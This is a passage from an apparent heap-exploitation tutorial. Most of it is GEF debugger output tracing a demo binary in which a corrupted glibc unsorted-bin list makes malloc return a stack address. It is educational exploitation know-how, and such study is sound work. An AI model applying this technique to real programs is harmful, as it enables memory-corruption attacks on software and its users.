0x00007fffffffdf50│+0x0020: 0x00007ffff7e2cd30  →  0x00007ffff7e2cd20  →  0x00007ffff7e2cd10  →  0x00007ffff7e2cd00  →  0x000055555555a050  →  0x0000000000000000
0x00007fffffffdf58│+0x0028: 0x00007ffff7e2cd30  →  0x00007ffff7e2cd20  →  0x00007ffff7e2cd10  →  0x00007ffff7e2cd00  →  0x000055555555a050  →  0x0000000000000000
0x00007fffffffdf60│+0x0030: 0x0000000000000000
0x00007fffffffdf68│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55555555523e <main+181>    mov edi, 0x430
   0x555555555243 <main+186>    call   0x555555555090 <malloc@plt>
   0x555555555248 <main+191>    mov edi, 0x2c
 → 0x55555555524d <main+196>    call   0x555555555090 <malloc@plt>
   ↳  0x555555555090 <malloc@plt+0>   endbr64
    0x555555555094 <malloc@plt+4>   bnd jmp QWORD PTR [rip+0x2f35]      # 0x555555557fd0 <malloc@got.plt>
    0x55555555509b <malloc@plt+11>  nop DWORD PTR [rax+rax*1+0x0]
    0x5555555550a0 <_start+0>       endbr64
    0x5555555550a4 <_start+4>       xor ebp, ebp
    0x5555555550a6 <_start+6>       mov r9, rdx
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
malloc@plt (
   $rdi = 0x000000000000002c,
   $rsi = 0x0000000000000430,
   $rdx = 0x0000000000000000
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "unsorted_linked", stopped 0x55555555524d in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555524d → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  si
0x0000555555555090 in malloc@plt ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559c20  →  0x0000000000000000
$rbx   : 0x0             
$rcx   : 0x441           
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf28  →  0x0000555555555252  →  <main+201> nop
$rbp   : 0x00007fffffffdfa0  →  0x0000000000000001
$rsi   : 0x430           
$rdi   : 0x2c            
$rip   : 0x0000555555555090  →  <malloc@plt+0> endbr64
$r8 : 0x3            
$r9 : 0x0            
$r10   : 0x1             
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0b8  →  0x00007fffffffe3be  →  "/Hackery/shogun/pwn_demos/unsorted_bin/un[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf28│+0x0000: 0x0000555555555252  →  <main+201> nop   ← $rsp
0x00007fffffffdf30│+0x0008: 0x00005555555592a0  →  0x0000555555559750  →  0x0000000000000000
0x00007fffffffdf38│+0x0010: 0x0000555555559760  →  0x00007ffff7e2d0f0  →  0x00007ffff7e2d0e0  →  0x00007ffff7e2d0d0  →  0x00007ffff7e2d0c0  →  0x00007ffff7e2d0b0  →  0x00007ffff7e2d0a0
0x00007fffffffdf40│+0x0018: 0x0000000000000000
0x00007fffffffdf48│+0x0020: 0x0000000000000041 ("A"?)
0x00007fffffffdf50│+0x0028: 0x00007ffff7e2cd30  →  0x00007ffff7e2cd20  →  0x00007ffff7e2cd10  →  0x00007ffff7e2cd00  →  0x000055555555a050  →  0x0000000000000000
0x00007fffffffdf58│+0x0030: 0x00007ffff7e2cd30  →  0x00007ffff7e2cd20  →  0x00007ffff7e2cd10  →  0x00007ffff7e2cd00  →  0x000055555555a050  →  0x0000000000000000
0x00007fffffffdf60│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555080 <__stack_chk_fail@plt+0> endbr64
   0x555555555084 <__stack_chk_fail@plt+4> bnd  jmp QWORD PTR [rip+0x2f3d]      # 0x555555557fc8 <__stack_chk_fail@got.plt>
   0x55555555508b <__stack_chk_fail@plt+11> nop DWORD PTR [rax+rax*1+0x0]
 → 0x555555555090 <malloc@plt+0>   endbr64
   0x555555555094 <malloc@plt+4>   bnd  jmp QWORD PTR [rip+0x2f35]      # 0x555555557fd0 <malloc@got.plt>
   0x55555555509b <malloc@plt+11>  nop  DWORD PTR [rax+rax*1+0x0]
   0x5555555550a0 <_start+0>    endbr64
   0x5555555550a4 <_start+4>    xor ebp, ebp
   0x5555555550a6 <_start+6>    mov r9, rdx
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "unsorted_linked", stopped 0x555555555090 in malloc@plt (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555090 → malloc@plt()
[#1] 0x555555555252 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  finish
Run till exit from #0  0x0000555555555090 in malloc@plt ()
0x0000555555555252 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdf50  →  0x00007ffff7e2cd30  →  0x00007ffff7e2cd20  →  0x00007ffff7e2cd10  →  0x00007ffff7e2cd00  →  0x000055555555a050  →  0x0000000000000000
$rbx   : 0x0             
$rcx   : 0x00007ffff7e2cd30  →  0x00007ffff7e2cd20  →  0x00007ffff7e2cd10  →  0x00007ffff7e2cd00  →  0x000055555555a050  →  0x0000000000000000
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf30  →  0x00005555555592a0  →  0x0000555555559750  →  0x0000000000000000
$rbp   : 0x00007fffffffdfa0  →  0x0000000000000001
$rsi   : 0x0             
$rdi   : 0x7             
$rip   : 0x0000555555555252  →  <main+201> nop
$r8 : 0x2            
$r9 : 0x0000555555559010  →  0x0000000000000000
$r10   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0b8  →  0x00007fffffffe3be  →  "/Hackery/shogun/pwn_demos/unsorted_bin/un[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf30│+0x0000: 0x00005555555592a0  →  0x0000555555559750  →  0x0000000000000000    ← $rsp
0x00007fffffffdf38│+0x0008: 0x0000555555559760  →  0x00007ffff7e2d0f0  →  0x00007ffff7e2d0e0  →  0x00007ffff7e2d0d0  →  0x00007ffff7e2d0c0  →  0x00007ffff7e2d0b0  →  0x00007ffff7e2d0a0
0x00007fffffffdf40│+0x0010: 0x0000000000000000
0x00007fffffffdf48│+0x0018: 0x0000000000000041 ("A"?)
0x00007fffffffdf50│+0x0020: 0x00007ffff7e2cd30  →  0x00007ffff7e2cd20  →  0x00007ffff7e2cd10  →  0x00007ffff7e2cd00  →  0x000055555555a050  →  0x0000000000000000   ← $rax
0x00007fffffffdf58│+0x0028: 0x00007ffff7e2cd30  →  0x00007ffff7e2cd20  →  0x00007ffff7e2cd10  →  0x00007ffff7e2cd00  →  0x000055555555a050  →  0x0000000000000000
0x00007fffffffdf60│+0x0030: 0x0000000000000000
0x00007fffffffdf68│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555243 <main+186>    call   0x555555555090 <malloc@plt>
   0x555555555248 <main+191>    mov edi, 0x2c
   0x55555555524d <main+196>    call   0x555555555090 <malloc@plt>
 → 0x555555555252 <main+201>    nop    
   0x555555555253 <main+202>    mov rax, QWORD PTR [rbp-0x8]
   0x555555555257 <main+206>    sub rax, QWORD PTR fs:0x28
   0x555555555260 <main+215>    je  0x555555555267 <main+222>
   0x555555555262 <main+217>    call   0x555555555080 <__stack_chk_fail@plt>
   0x555555555267 <main+222>    leave  
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "unsorted_linked", stopped 0x555555555252 in main (), reason: TEMPORARY BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555252 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$2 = 0x7fffffffdf50
gef➤  vmmap 0x7fffffffdf50
[ Legend:  Code | Heap | Stack ]
Start           End             Offset          Perm Path
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] large_bins[63]: fw=0x555555559290, bk=0x555555559750
 →   Chunk(addr=0x5555555592a0, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x555555559760, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 2 chunks in 1 large non-empty bins.
gef➤  c
Continuing.
[Inferior 1 (process 89488) exited normally]
```

Just like that, we see that we have allocated a stack ptr from malloc via leveraging the unsorted bin linked list.


